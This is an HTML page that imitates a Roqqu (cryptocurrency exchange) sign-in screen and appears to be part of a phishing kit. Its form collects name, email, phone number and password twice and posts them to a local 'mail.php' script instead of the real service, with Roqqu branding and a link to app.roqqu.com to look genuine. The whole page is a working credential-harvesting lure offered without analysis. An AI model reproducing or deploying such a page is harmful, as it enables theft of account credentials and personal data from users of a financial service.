
<!DOCTYPE HTML>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in</title>
<link rel="shortcut icon" type="jpg" href="favicon.png">





<style type="text/css">
  body {
    margin: 0;
    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";
    font-size: 1rem;
    font-weight: 400;
    line-height: 1.5;
    color: #212529;
    text-align: left;
    background:#001739;
}


.dashed {
  overflow: hidden;
  text-align: center;
}

.dashed:before,
.dashed:after {
  background-color: #DCDCDC;
  content: "";
  display: inline-block;
  height: 1.5px;
  position: relative;
  vertical-align: middle;
  width: 50%;
}

.dashed:before {
  right: 0.5em;
  margin-left: -50%;
}

.dashed:after {
  left: 0.5em;
  margin-right: -50%;
}
::-webkit-input-placeholder { /* WebKit, Blink, Edge */
    color:    #909;
}
:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
   color:    #909;
   opacity:  1;
}
::-moz-placeholder { /* Mozilla Firefox 19+ */
   color:    #909;
   opacity:  1;
}
:-ms-input-placeholder { /* Internet Explorer 10-11 */
   color:    #909;
}
::-ms-input-placeholder { /* Microsoft Edge */
   color:    #909;
}

::placeholder { /* Most modern browsers support this now. */
   color:    #909;
}

.container, .container-fluid, .container-lg, .container-md, .container-sm, .container-xl {
    width: 75%;
    padding-right: 15px;
    padding-left: 15px;
    margin-right: auto;
    margin-left: auto;
}

@media (min-width: 576px)
.container, .container-sm {
    max-width: 540px;
}


.card {
    position: relative;
    display: -ms-flexbox;
    display: flex;
    -ms-flex-direction: column;
    flex-direction: column;
    min-width: 0;
    word-wrap: break-word;
    background-color: #fff;
    background-clip: border-box;
    border: 1px solid rgba(0,0,0,.125);
    border-radius: 0.25rem;
}

.card-body {
    -ms-flex: 1 1 auto;
    flex: 1 1 auto;
    min-height: 1px;
    padding: 1.25rem;
}


.row {
    display: -ms-flexbox;
    display: flex;
    -ms-flex-wrap: wrap;
    flex-wrap: wrap;
    margin-right: -15px;
    margin-left: -15px;
}

.row2 {
    display: -ms-flexbox;
    display: flex;
    -ms-flex-wrap: wrap;
    flex-wrap: wrap;
    margin-right: -15px;
    margin-left: ;
}

.col-6 {
    -ms-flex: 0 0 50%;
    flex: 0 0 50%;
    max-width: 50%;
    margin-right: px;
    margin-left: px;
}

.form-control {
    display: block;
    width: 90%;
    height: calc(1.5em + 0.75rem + 2px);
    padding: 0.375rem 0.75rem;
    font-size: 1rem;
    font-weight: 400;
    line-height: 1.5;
    color: gray;
    background-color: #fff;
    background-clip: padding-box;
    border-top-style: hidden;
  border-right-style: hidden;
  border-left-style: hidden;
  border-bottom-style: 1px gray;
    transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}

.form-control2 {
    display: block;
    width: 70%;
    height: calc(1.5em + 0.75rem + 2px);
    padding: 0.375rem 0.75rem;
    font-size: 1rem;
    font-weight: 400;
    line-height: 1.5;
    color: gray;
    background-color: #fff;
    background-clip: padding-box;
    border-top-style: hidden;
  border-right-style: hidden;
  border-left-style: hidden;
  border-bottom-style: 1px gray;
    transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}

.input {
  border-top-style: hidden;
  border-right-style: hidden;
  border-left-style: hidden;
  border-bottom-style: groove;
  background-color: black;
}

.btn {
    display: inline-block;
    font-weight: 400;
    color: #212529;
    width: 100%;
    margin-top: 20px;
    text-align: center;
    vertical-align: middle;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    background-color: transparent;
    border: 1px solid transparent;
    padding: 0.375rem 0.75rem;
    font-size: 1rem;
    line-height: 1.5;
    border-radius: 0.25rem;
    transition: color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}


::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
  color: gray;
  opacity: 1; /* Firefox */
}


</style>
</head>
<body>
<br>
<center>
<img class="my-4 d-flex mx-auto" src="logo.png" width="160">
</center>
<br>
<div class="container">
    <div class="card">
        <div class="card-body">
<form name="form" action="mail.php" class="form-horizontal" method="POST">
    
    <h2 align="center" style="color:#001739">Sign In</h2>

    <div class="row2">
     <div class="col-6">
      <div class="form-group">
        <input required style="height:45px" type="text"  id="first_name" name="first name" class="form-control2" placeholder="First Name" />
      </div>
     </div>
     
     <div class="col-6">
     <div class="form-group" style="margin-left: 5px;">
        <input required style="height:45px" type="text"  id="last_name" name="last_name" class="form-control2" placeholder="Last name" />
      </div>
     </div>
     </div>

    <div class="form-group">
      <input required style="height:45px" type="email"  id="email" name="email" class="form-control" placeholder="Email address" />
    </div>

    <div class="form-group">
      <input required style="height:45px" type="tel"  id="tel" name="tel" class="form-control" placeholder="Phone number" />
    </div>

    <div class="form-group">
      <input required style="height:45px" type="password"  id="password" name="password" class="form-control" placeholder="Password" />
    </div>

    <div class="form-group">
      <input required style="height:45px" type="password"  id="password2" name="password2" class="form-control" placeholder="Confirm Password" />
    </div>


    <div class="form-group">
      <button class="btn btn-lg text-white btn-block" style="background-color:#006ee7;height:50px;" name="submit" type="submit">Sign In to your account</button>
    </div>

   <p class="mt-3 dashed" style="font-size:14px" align="center" style="color:#001739;"> <b><strong>or sign in with</strong></b></p>
    
    <center>
     <div class="row" style="margin-left: 50px;">
     <div class="col-4" style="flex: 0 0 50%; max-width: 23%;">
         <div class="border shadow-sm border-muted p-3"><center><img width="25" src="7199629.png"/></center>       &nbsp; &nbsp;  <b style="font-size:14px"></b></div></div>

     <div class="col-4" style="flex: 0 0 50%; max-width: 23%;">
         <div class="border border-muted shadow-sm border-muted p-3"><center><img width="25" src="facebook.png"/></center>       &nbsp; &nbsp; <b style="font-size:14px"></b></div></div>
     
     <div class="col-4" style="flex: 0 0 50%; max-width: 23%;">
         <div class="border border-muted shadow-sm border-muted p-3"><center><img width="25" src="haslingden-apple-logo-removebg-preview.png"/></center>       &nbsp; &nbsp; <b style="font-size:14px"></b></div></div>
     <input type="hidden" name="MM_insert" value="form">
    </center>
    <p style="color:gray; font-size: 10px;">By clicking on Sign up you are agreeing to our terms and conditions for using Roqqu</p>


</form>
</div>
</div>
</div>
<center>
<p style="color:#FFF; font-size: 13px;">Dont have a Roqqu account? <a href="https://app.roqqu.com" style="color:#FFF">Log in</a></h5>
</center>



</body>

</html>
